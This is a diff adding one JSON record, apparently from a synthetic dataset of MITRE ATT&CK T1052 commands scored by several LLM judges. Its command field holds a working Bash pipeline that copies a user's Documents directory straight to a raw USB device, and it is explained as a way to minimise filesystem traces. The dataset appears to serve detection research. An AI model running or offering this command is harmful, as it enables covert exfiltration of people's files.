@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "tar -C \"$HOME\" -czf - Documents | dd of=\"/dev/disk/by-label/USBSTICK\" bs=4M oflag=direct,dsync iflag=fullblock status=none",
+  "explanation": "Packages the user's Documents directory and writes the compressed stream directly to the raw USB device by label, avoiding filesystem writes and metadata.",
+  "rationale_steps": [
+    "Create a compressed stream of target files with tar and gzip",
+    "Address the external drive using a stable by-label path",
+    "Write the stream directly to the raw device with dd using large blocks and direct I/O to minimize traces"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-0fb052df",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The pipeline is well-formed with balanced quoting and valid tar and dd options.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly streams a gzipped tar of the Documents directory to a raw USB block device to avoid filesystem traces, but typically requires elevated permissions and a correctly labeled device to succeed.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T07:18:38.094550Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, valid flags for tar and dd, proper pipe operator, and correct use of variable expansion and special device path.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by compressing the Documents directory with tar and writing the raw stream directly to a USB device identified by label using dd with direct/dsync flags, bypassing filesystem metadata and evading detection — fully consistent with physical medium exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:32:35.469443Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is syntactically perfect for Bash, with correct flag usage for both tar and dd, properly handled pipes, and valid variable referencing.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively performs raw exfiltration to a physical device as described, though writing directly to a block device node typically requires root privileges which contradicts the 'None' privilege level provided.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:32:39.368195Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
